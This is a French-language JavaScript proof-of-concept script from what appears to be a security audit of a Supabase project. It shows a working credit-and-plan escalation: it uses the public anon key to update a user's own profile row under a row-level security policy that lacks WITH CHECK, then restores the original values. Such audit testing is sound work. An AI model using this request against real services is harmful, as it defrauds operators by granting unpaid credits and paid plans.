import {
  COMPTE_A,
  clientAnon,
  log,
  seConnecter,
  soldeDe,
  titre,
  verdict,
} from "./_lib.mjs";

// ============================================
// PREUVE 01 — Escalade de crédits via RLS
// ============================================
// Faille visée : audit/plan-implementation.md § B0.1
// Origine      : supabase/migrations/001_initial_schema.sql:186-188
//
//   CREATE POLICY "Users can update own profile"
//     ON public.profiles FOR UPDATE
//     USING (auth.uid() = id);        ← ni WITH CHECK, ni restriction de colonnes
//
// Conséquence : un utilisateur authentifié, avec la seule clé anon (publique,
// présente dans le bundle JavaScript du site), peut modifier n'importe quelle
// colonne de son propre profil — y compris `credits` et `plan`.
//
// Ce script reproduit exactement ce qu'un utilisateur peut taper dans la console
// de son navigateur, sans aucun outil particulier.
// ============================================

const CREDITS_VISES = 9999;

titre("01 — Escalade de crédits via la policy RLS « Users can update own profile »");

const { user, jeton } = await seConnecter(COMPTE_A);
log(`Connecté en tant que ${COMPTE_A.email} (${user.id})`);

const avant = await soldeDe(user.id);
log(`Solde et plan avant l'attaque : ${avant.credits} crédits, plan « ${avant.plan} »`);

// --- L'attaque : une seule requête, avec la clé publique anon ---
log("");
log("Requête envoyée avec la clé anon et le jeton de l'utilisateur :");
log(`  supabase.from("profiles").update({ credits: ${CREDITS_VISES}, plan: "pro" })`);
log(`                           .eq("id", "${user.id}")`);

const supabase = clientAnon(jeton);
const { data, error } = await supabase
  .from("profiles")
  .update({ credits: CREDITS_VISES, plan: "pro" })
  .eq("id", user.id)
  .select();

if (error) {
  log(`Réponse : refus de PostgREST — ${error.code} ${error.message}`);
} else {
  log(`Réponse : ${data.length} ligne(s) modifiée(s)`);
}

const apres = await soldeDe(user.id);
log(`Solde et plan après l'attaque : ${apres.credits} crédits, plan « ${apres.plan} »`);

const exploite = apres.credits !== avant.credits || apres.plan !== avant.plan;

// --- Remise en état, pour que le script reste rejouable ---
if (exploite) {
  const { clientAdmin } = await import("./_lib.mjs");
  await clientAdmin()
    .from("profiles")
    .update({ credits: avant.credits, plan: avant.plan })
    .eq("id", user.id);
  log(`Remise en état : solde restauré à ${avant.credits} crédits`);
}

verdict(
  exploite,
  `un utilisateur authentifié s'est attribué ${apres.credits} crédits et le plan « ${apres.plan} »` +
    " avec la seule clé publique du site",
  "la modification de `credits` et `plan` par l'utilisateur est refusée par la base"
);
